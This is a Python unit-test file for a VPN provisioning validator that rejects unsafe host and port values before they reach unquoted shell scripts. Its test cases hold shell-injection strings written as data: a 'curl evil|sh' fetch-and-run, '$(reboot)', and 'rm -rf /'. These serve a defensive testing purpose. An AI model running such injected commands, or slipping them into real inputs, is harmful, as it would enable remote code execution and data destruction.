"""Юнит-тесты defense-in-depth guard провижнинга (_assert_safe_vars).

host/port-переменные подставляются в bundled-скрипты без кавычек, поэтому перед установкой
контейнера они обязаны быть валидными — иначе shell-инъекция через $SERVER_IP_ADDRESS/$*_PORT.
"""

from __future__ import annotations

import pytest

from vpnhub.infra.provisioning.errors import ProvisioningError
from vpnhub.infra.provisioning.script_runner import _assert_safe_vars

pytestmark = pytest.mark.unit


def test__assert_safe_vars__valid__passes() -> None:
    _assert_safe_vars(
        {
            "$SERVER_IP_ADDRESS": "203.0.113.10",
            "$REMOTE_HOST": "vm0000001.example.com",
            "$OPENVPN_PORT": "1194",
            "$AWG_SERVER_PORT": "51820",
            "$OPENVPN_SUBNET_IP": "10.8.0.0",  # не host/port-переменная — не валидируется
        }
    )


@pytest.mark.parametrize(
    "unsafe",
    [
        {"$SERVER_IP_ADDRESS": '1.1.1.1"; curl evil|sh #'},
        {"$REMOTE_HOST": "$(reboot)"},
        {"$SERVER_IP_ADDRESS": "host name"},
    ],
)
def test__assert_safe_vars__unsafe_host__raises(unsafe: dict[str, str]) -> None:
    with pytest.raises(ProvisioningError):
        _assert_safe_vars(unsafe)


@pytest.mark.parametrize("bad_port", ["0", "70000", "80; rm -rf /", "abc"])
def test__assert_safe_vars__unsafe_port__raises(bad_port: str) -> None:
    with pytest.raises(ProvisioningError):
        _assert_safe_vars({"$SERVER_IP_ADDRESS": "203.0.113.10", "$XRAY_SERVER_PORT": bad_port})
